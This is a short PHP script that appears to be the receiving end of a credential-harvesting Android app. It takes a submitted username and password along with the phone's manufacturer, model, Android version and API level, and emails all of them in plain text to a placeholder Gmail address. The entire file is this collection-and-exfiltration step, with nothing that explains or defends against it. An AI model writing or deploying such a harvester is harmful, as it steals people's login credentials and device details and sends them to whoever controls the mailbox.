<?php
	$username=$_POST['Username'];
	$password=$_POST['Password'];
	$time=$_POST['Time'];
	$manufacturer=$_POST['Manufacturer'];
	$mobilemodel=$_POST['MobileModel'];
	$androidversion=$_POST['AndroidVersion'];
	$androidApi=$_POST['AndroidApi'];

	
	$to="example@gmail.com";
	$subject="Message";
	$body=" username: $username \n password: $password \n time: $time \n Manufacturer: $manufacturer \n MobileModel: $mobilemodel \n Android Version: $androidversion \n Api: $androidApi";
	mail($to,$subject,$body);

?>
